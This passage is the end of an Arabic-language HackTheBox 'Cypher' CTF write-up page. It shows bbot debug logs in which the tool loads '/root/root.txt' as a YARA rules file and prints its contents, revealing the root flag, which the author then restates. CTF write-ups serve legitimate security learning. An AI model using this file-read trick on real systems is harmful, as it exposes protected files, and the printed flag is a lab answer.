+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing excavate - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;excavate&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing txt - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;txt&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing python - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;python&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing json - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;json&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing dnsresolve - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;dnsresolve&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing speculate - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;speculate&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loading 0 scan modules: 
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;aggregate&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;cloudcheck&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;dnsresolve&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;excavate&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;speculate&quot;
+</span><span style="color:#eb6772;">[INFO]</span><span style="color:#abb2bf;"> Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loading 5 output modules: csv,json,python,stdout,txt
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;csv&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;json&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;python&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;stdout&quot;
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loaded module </span><span style="color:#9acc76;">&quot;txt&quot;
+</span><span style="color:#eb6772;">[INFO]</span><span style="color:#abb2bf;"> Loaded 5/5 output modules, (csv,json,python,stdout,txt)
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Setting up modules
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> _scan_ingress: Setting up module _scan_ingress
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> _scan_ingress: Finished setting up module _scan_ingress
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> dnsresolve: Setting up module dnsresolve
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> dnsresolve: Finished setting up module dnsresolve
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> aggregate: Setting up module aggregate
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> aggregate: Finished setting up module aggregate
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> cloudcheck: Setting up module cloudcheck
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> cloudcheck: Finished setting up module cloudcheck
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Setting up module excavate
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule CSPExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule EmailExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule ErrorExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule FunctionalityExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule HostnameExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule JWTExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule NonHttpSchemeExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule ParameterExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAMETER events
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule SerializationExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Including Submodule URLExtractor
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Successfully loaded custom yara rules file </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">/root/root.txt</span><span style="color:#cd74e8;">]
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Final combined yara rule contents: cc035683329642ce27f1de7dd4981a48
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.csv: Setting up module csv
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.csv: Finished setting up module csv
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.json: Setting up module json
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.json: Finished setting up module json
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.python: Setting up module python
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.python: Finished setting up module python
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.stdout: Setting up module stdout
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.stdout: Finished setting up module stdout
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.txt: Setting up module txt
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> output.txt: Finished setting up module txt
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.speculate: Setting up module speculate
+</span><span style="color:#eb6772;">[INFO]</span><span style="color:#abb2bf;"> internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.speculate: Finished setting up module speculate
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> _scan_egress: Setting up module _scan_egress
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> _scan_egress: Finished setting up module _scan_egress
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for cloudcheck (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for _scan_egress (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for json (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for aggregate (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for txt (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for python (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for _scan_ingress (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for dnsresolve (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for speculate (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for csv (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for stdout (success)
+</span><span style="color:#eb6772;">[INFO]</span><span style="color:#abb2bf;"> internal.excavate: Compiling 10 YARA rules
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> internal.excavate: Finished setting up module excavate
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setup succeeded for excavate (success)
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setting intercept module dnsresolve._incoming_event_queue to previous intercept module _scan_ingress.outgoing_event_queue
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setting intercept module cloudcheck._incoming_event_queue to previous intercept module dnsresolve.outgoing_event_queue
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Setting intercept module _scan_egress._incoming_event_queue to previous intercept module cloudcheck.outgoing_event_queue
+</span><span style="color:#eb6772;">[SUCC]</span><span style="color:#abb2bf;"> Setup succeeded for 12/12 modules.
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No words to save
+</span><span style="color:#eb6772;">graphasm@cypher:~$ 
+</span></code></pre>
+<p>الـ flag النهائي:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
+</span><span style="color:#abb2bf;">[DBUG] internal.excavate: Final combined yara rule contents: cc035683329642ce27f1de7dd4981a48
+</span></code></pre>
+<h2 id="conclusion">Conclusion</h2>
+<p>اتمني تكون استفدت حاجة زي ما أنا استفدت من الـmachine دي!</p>
+<p><a href="https://app.hackthebox.com/profile/2060398">بروفايلي علي HackTheBox</a></p>
+<p><a href="https://keybase.io/makyavelli">Keybase</a></p>
+<p><a href="https://x.com/MachIaVellill">X</a></p>
+<!-- تجربة فاشلة -->
+        </div>
+
+        
+        <footer style="text-align: right;">
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/ctf/">CTF</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/ctf/">CTF</a>
+                        
+                            
+                                ,
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/hackthebox/">HackTheBox</a>
+                        
+                            
+                                ,
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/htb/">HTB</a>
+                        
+                            
+                                ,
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/challenge/">Challenge</a>
+                        
+                            
+                                ,
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/neo4j/">neo4j</a>
+                        
+                            
+                                ,
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/cypher/">cypher</a>
+                        
+                            
+                                and
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/bbot/">bbot</a>
+                        
+                    
+                
+            </p>
+            
+        </footer>
+        
+    </article>
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
